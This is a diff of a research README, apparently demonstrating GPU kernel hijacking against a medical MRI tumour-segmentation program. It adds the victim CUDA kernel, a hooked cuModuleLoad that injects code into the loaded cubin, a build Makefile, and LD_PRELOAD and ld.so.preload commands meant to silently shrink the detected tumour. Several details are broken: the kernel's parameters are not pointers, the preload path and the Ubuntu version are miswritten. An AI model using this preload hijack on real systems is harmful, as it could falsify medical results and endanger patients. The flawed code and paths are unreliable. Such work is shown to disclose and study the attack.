@@ -38,17 +38,81 @@ Finally, an attacker can hijack a GPU kernel through the above two steps. We con
 
 ## <font size=5> III. Attack Case </font>
 
+Image processing is one of the most important GPU applications. GPU can calculate a large number of pixels simultaneously, which greatly accelerates image processing. In this subsection, we implement a medical image segmentation application on GPU and show how to tamper with the segmentation result.
 
+**Experimental Setup**
+
+| Operating System |              GPU Model               | CUDA Version |
+| :--------------: | :----------------------------------: | :----------: |
+|  Ubuntu 2022.04  | NVIDIA GTX1050 (Pascal Arch., SM_61) |     12.2     |
+
+**Victim**
+
+As shown in Fig. 3 (a), it is a brain magnetic resonance imaging. Compared to the normal area, the gray value of the tumor region is significantly higher. Hence, the medical personnel can utilize a threshold segmentation algorithm to highlight the affected brain area. If the pixel value is greater than the threshold, it will be reassigned to a new gray value, like 255 (white). Otherwise, it will be assigned to 0 (black). After all the pixels are processed, the medical personnel can acquire the detected tumor region. 
+
+```c++
+__global__ void kernel(unsigned char I_image, //input image
+                       unsigned char O_image) //output image
+{
+	int i=blockDim.x*blockIdx.x+threadIdx.x;
+    int threshold = 230;
+    /* threshold segmentation */
+	if (I_image[i]>threshold)
+		O_image[i]=255;
+	else
+		O_image[i]=0;
+}
+```
+Finally, the victim compiles and executes this kernel. In Fig. 3 (b), we show the processed image, where the white region is the detected tumor. We can observe that the tumor area is large, which indicates the patient's condition is very serious. The entire program is located in **/ImageProcess/segment_gpu**. 
+
+```
+./image_segment.o
+```
 
 ![GPU2](https://github.com/uestc-cyberlab/gpu_kernel_hijack/blob/main/images/tumor.png)
 
+**Attacker**
 
+An attacker designs a malicious kernel loading API and compiles it to a DLL, as introduced in Section II. An attacker implements a malicious kernel loading API which has the same interface with the normal one. In the malicious API, attacker illegally modifies the GPU kernel file. This entire program is located in **/ImageProcess/hijack_tool/hijack.cu**. 
 
+```c++
+CUresult CUDAAPI cuModuleLoad(CUmodule *module, const char *fname)
+{
+	//1.inject malicous instruction into cubin
+	char* image = injector(fname);
+	//2.load malicious cubin image into cuModule
+	CUresult code = cuModuleLoadData(module, image);
+	if(code!=CUDA_SUCCESS)
+	{
+		return CUDA_ERROR_INVALID_VALUE;
+	}
+	return CUDA_SUCCESS;
+}
+```
 
-<!-- cd /D/github/gpu_kernel_hijack -->
-<!-- git add . -->
-<!-- git commit -m "Initial commit" -->
-<!-- git push origin main -->
+After that, attacker compiles the malicious kernel loading API to a dynamic link library (DLL). The compile command is located in **/ImageProcess/hijack_tool/Makefile**. 
 
-<!-- ctrl+k v -->
+```makefile
+image_hijack.so: hijack.o
+	nvcc -arch=sm_61 hijack.o -lcuda -lcudart_static -shared -o image_hijack.so
+	
+hijack.o: hijack.cu
+	nvcc -Xptxas -astoolspatch --keep-device-functions -arch=sm_61 -Xcompiler -fPIC -c hijack.cu -o hijack.o
+
+clean:
+	rm -f *.so *.o
+```
+
+Next, the attacker modifies the pre-loading environment variable "LD_PRELOAD" or the pre-loading  configuration file "/etc.ld.so.preload" to escalate the linking priority of the malicious DLL.
+
+```
+LD_PRELOAD = ./image_hijack.so
+```
+
+```
+sudo vim /etc.ld.so.preload
+./image_hijack.so
+```
+
+Finally, once the victim launch the CUDA program, the malicious API will hijack the GPU kernel and implant a Trojan. As shown in Fig. 4, it will make the detected tumor area decrease sharply. We can observe that the tumor area is very small, which may cause a misjudgment of the patient's condition. This can result in a serious medical accident. 
 
